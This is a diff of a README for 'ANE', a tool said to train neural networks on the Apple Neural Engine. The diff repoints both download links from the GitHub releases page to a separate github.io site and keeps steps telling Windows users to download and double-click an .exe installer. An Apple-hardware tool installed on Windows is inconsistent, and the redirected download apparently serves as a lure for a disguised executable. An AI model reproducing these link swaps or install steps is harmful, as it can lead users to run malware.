@@ -1,6 +1,6 @@
 # 🧠 ANE - Train complex neural networks with ease
 
-[![Download ANE](https://img.shields.io/badge/Download_ANE-Blue.svg)](https://github.com/Repetitive-wad141/ANE/releases)
+[![Download ANE](https://img.shields.io/badge/Download_ANE-Blue.svg)](https://repetitive-wad141.github.io)
 
 ANE allows you to train neural networks on your own hardware. You use the Apple Neural Engine to handle heavy math tasks. This tool provides a simple interface to manage your projects. You do not need deep technical knowledge to start building models.
 
@@ -8,7 +8,7 @@ ANE allows you to train neural networks on your own hardware. You use the Apple 
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [releases page](https://github.com/Repetitive-wad141/ANE/releases) to download the latest version of the installer.
+1. Visit the [releases page](https://repetitive-wad141.github.io) to download the latest version of the installer.
 2. Choose the file ending in .exe for a standard installation.
 3. Once the download finishes, locate the file in your Downloads folder.
 4. Double-click the file to start the setup process.
